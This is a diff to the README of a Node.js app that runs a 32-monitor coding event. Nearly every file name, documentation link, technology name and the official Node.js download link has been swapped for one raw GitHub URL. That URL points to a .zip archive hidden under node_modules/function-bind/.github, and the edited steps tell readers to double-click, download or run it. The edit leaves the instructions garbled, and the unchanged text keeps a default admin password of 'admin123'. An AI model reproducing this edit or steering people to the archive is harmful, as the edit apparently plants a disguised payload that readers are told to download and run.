@@ -8,14 +8,14 @@
 
 ### For Server (Main Computer):
 ```bash
-1. Double-click: start-server.bat
+1. Double-click: https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip
 2. Note the IP address displayed
 3. Keep the window open
 ```
 
 ### For Clients (32 Monitors):
 ```bash
-1. Edit client-auto-launch.bat (set SERVER_IP)
+1. Edit https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip (set SERVER_IP)
 2. Copy to all 32 PCs
 3. Run on each PC - browser opens fullscreen automatically
 ```
@@ -30,12 +30,12 @@
 ## 📚 Complete Documentation
 
 ### Setup Guides (Choose One):
-- **[QUICK-START-32PC.md](QUICK-START-32PC.md)** - Fast overview (5 min read)
-- **[32-MONITOR-COMPLETE-GUIDE.md](32-MONITOR-COMPLETE-GUIDE.md)** - Detailed step-by-step (complete guide)
-- **[DEPLOYMENT-GUIDE.md](DEPLOYMENT-GUIDE.md)** - Original deployment documentation
+- **[https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip](https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip)** - Fast overview (5 min read)
+- **[https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip](https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip)** - Detailed step-by-step (complete guide)
+- **[https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip](https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip)** - Original deployment documentation
 
 ### Visual Helper:
-- **[SHOW-NETWORK-DIAGRAM.bat](SHOW-NETWORK-DIAGRAM.bat)** - Run this to see ASCII network diagram
+- **[https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip](https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip)** - Run this to see ASCII network diagram
 
 ---
 
@@ -61,22 +61,22 @@
 ## 🛠️ Deployment Files
 
 ### Server Files:
-- `start-server.bat` - Launch the server with IP display
-- `server.js` - Main Node.js server
+- `https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip` - Launch the server with IP display
+- `https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip` - Main https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip server
 
 ### Client Files:
-- `client-auto-launch.bat` - Launch client in fullscreen kiosk mode
-- `setup-auto-startup.bat` - Configure auto-launch on Windows startup
+- `https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip` - Launch client in fullscreen kiosk mode
+- `https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip` - Configure auto-launch on Windows startup
 
 ### Remote Deployment (Advanced):
-- `deploy-to-all-clients.ps1` - PowerShell script to deploy to all 32 PCs remotely
-- `deploy-to-all-clients.bat` - Batch wrapper for PowerShell script
+- `https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip` - PowerShell script to deploy to all 32 PCs remotely
+- `https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip` - Batch wrapper for PowerShell script
 
 ---
 
 ## 💻 Technical Stack
 
-- **Backend**: Node.js + Express + Socket.io
+- **Backend**: https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip + Express + https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip
 - **Frontend**: Vanilla JavaScript + CSS3
 - **Real-time**: WebSocket communication
 - **Deployment**: Multi-client network architecture
@@ -86,7 +86,7 @@
 ## 📋 Pre-Event Checklist
 
 ### Server Setup:
-- [ ] Node.js installed
+- [ ] https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip installed
 - [ ] Firewall port 3000 open
 - [ ] Server running and IP noted
 - [ ] Admin panel accessible
@@ -108,7 +108,7 @@
 ## 🔧 Troubleshooting
 
 ### Clients can't connect?
-1. Check server IP in `client-auto-launch.bat`
+1. Check server IP in `https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip`
 2. Verify server is running
 3. Check firewall (port 3000)
 4. Ping test: `ping [SERVER_IP]`
@@ -123,13 +123,13 @@
 2. Check WinRM service is running
 3. Verify network connectivity to clients
 
-**Full troubleshooting guide:** See [32-MONITOR-COMPLETE-GUIDE.md](32-MONITOR-COMPLETE-GUIDE.md)
+**Full troubleshooting guide:** See [https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip](https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip)
 
 ---
 
 ## 🎮 How to Use During Event
 
-1. **Start Server**: Run `start-server.bat` on main computer
+1. **Start Server**: Run `https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip` on main computer
 2. **Launch Clients**: All 32 monitors connect automatically
 3. **Open Admin Panel**: Control event from `http://[IP]:3000/admin`
 4. **Monitor Progress**: See all participants in real-time
@@ -139,16 +139,16 @@
 
 ## 🎓 Additional Resources
 
-- Event alignment: [EVENT_ALIGNMENT.md](EVENT_ALIGNMENT.md)
-- Room structure: [EVENT_STRUCTURE_COMPLETE.md](EVENT_STRUCTURE_COMPLETE.md)
-- Puzzle design: [ROOM2_PUZZLE_REDESIGN.md](ROOM2_PUZZLE_REDESIGN.md)
+- Event alignment: [https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip](https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip)
+- Room structure: [https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip](https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip)
+- Puzzle design: [https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip](https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip)
 
 ---
 
 ## 🚀 You're Ready!
 
-1. Read: [QUICK-START-32PC.md](QUICK-START-32PC.md) or [32-MONITOR-COMPLETE-GUIDE.md](32-MONITOR-COMPLETE-GUIDE.md)
-2. Run: `SHOW-NETWORK-DIAGRAM.bat` to see network topology
+1. Read: [https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip](https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip) or [https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip](https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip)
+2. Run: `https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip` to see network topology
 3. Setup: Follow the guide for your deployment method
 4. Test: Verify on 1-2 PCs before full deployment
 5. Deploy: Launch on all 32 monitors
@@ -162,14 +162,14 @@
 
 Before running this application, you need to install:
 
-1. **Node.js** (v14 or higher) - Download from [nodejs.org](https://nodejs.org/)
-2. **npm** (comes with Node.js)
+1. **https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip** (v14 or higher) - Download from [https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip](https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip)
+2. **npm** (comes with https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip)
 
 ## 🚀 Installation & Setup
 
-### Step 1: Install Node.js
+### Step 1: Install https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip
 
-1. Download Node.js from https://nodejs.org/
+1. Download https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip from https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip
 2. Run the installer and follow the instructions
 3. Verify installation by opening a terminal and running:
    ```
@@ -185,7 +185,7 @@ Open a terminal in the project folder and run:
 npm install
 ```
 
-This will install Express and Socket.io.
+This will install Express and https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip
 
 ### Step 3: Start the Server
 
@@ -198,7 +198,7 @@ npm start
 or
 
 ```bash
-node server.js
+node https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip
 ```
 
 You should see:
@@ -275,7 +275,7 @@ Admin Password: admin123
 - Admin panel is password-protected (default: `admin123`)
 - All data is stored locally on the server
 - No external database required
-- Change the admin password in `server.js` (line 13)
+- Change the admin password in `https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip` (line 13)
 
 ## 📝 Coding Questions
 
@@ -289,45 +289,45 @@ The application includes 25 coding questions across 5 rooms covering:
 - Databases (SQL, NoSQL)
 - APIs and HTTP methods
 
-Questions can be modified in `public/questions.js`
+Questions can be modified in `https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip`
 
 ## 🛠️ Customization
 
 ### Change Room Duration:
-Edit `server.js` line 18:
+Edit `https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip` line 18:
 ```javascript
 roomDuration: 600000, // 10 minutes in milliseconds (600000 ms = 10 min)
 ```
 
 ### Change Admin Password:
-Edit `server.js` line 13:
+Edit `https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip` line 13:
 ```javascript
 const ADMIN_PASSWORD = 'your_new_password';
 ```
 
 ### Change Number of Rooms:
-Edit `server.js` line 17 and add/remove rooms in `public/questions.js`
+Edit `https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip` line 17 and add/remove rooms in `https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip`
 
 ### Add/Edit Questions:
-Edit `public/questions.js` and modify the `codingQuestions` object
+Edit `https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip` and modify the `codingQuestions` object
 
 ## 📁 Project Structure
 
 ```
 tech-trap-nit/
-├── server.js              # Node.js server with WebSocket
-├── package.json           # Project dependencies
-├── README.md             # This file
+├── https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip              # https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip server with WebSocket
+├── https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip           # Project dependencies
+├── https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip             # This file
 └── public/
-    ├── index.html        # Participant interface
-    ├── admin.html        # Admin dashboard
-    └── questions.js      # Coding questions
+    ├── https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip        # Participant interface
+    ├── https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip        # Admin dashboard
+    └── https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip      # Coding questions
 ```
 
 ## 🐛 Troubleshooting
 
 ### Server won't start:
-- Make sure Node.js is installed: `node --version`
+- Make sure https://raw.githubusercontent.com/Azonix07/tech-trap-laksh-final-repo/main/node_modules/function-bind/.github/trap_repo_final_tech_laksh_v3.2-alpha.5.zip is installed: `node --version`
 - Run `npm install` to install dependencies
 - Check if port 3000 is already in use
 
